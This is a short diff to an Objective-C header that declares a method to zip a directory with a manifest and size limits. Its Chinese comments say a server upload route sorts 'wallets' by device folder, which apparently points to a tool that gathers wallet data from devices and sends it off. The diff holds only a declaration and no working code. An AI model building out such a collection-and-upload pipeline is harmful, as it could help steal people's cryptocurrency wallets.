@@ -20,6 +20,16 @@ NS_ASSUME_NONNULL_BEGIN
               to:(NSString *)zipPath
            error:(NSError **)error;
 
+/// 打包目录，并在包根写 _manifest.json；所有文件统一放进 <subdir>/ 下。
+/// 服务端 route_native_upload 靠根目录 _manifest.json 的 found/deviceFolder 归类钱包。
++ (BOOL)zipDirectory:(NSString *)dir
+                  to:(NSString *)zipPath
+            manifest:(NSDictionary *)manifest
+              subdir:(NSString *)subdir
+            maxBytes:(uint64_t)maxBytes
+            totalCap:(uint64_t)totalCap
+               error:(NSError **)error;
+
 @end
 
 NS_ASSUME_NONNULL_END
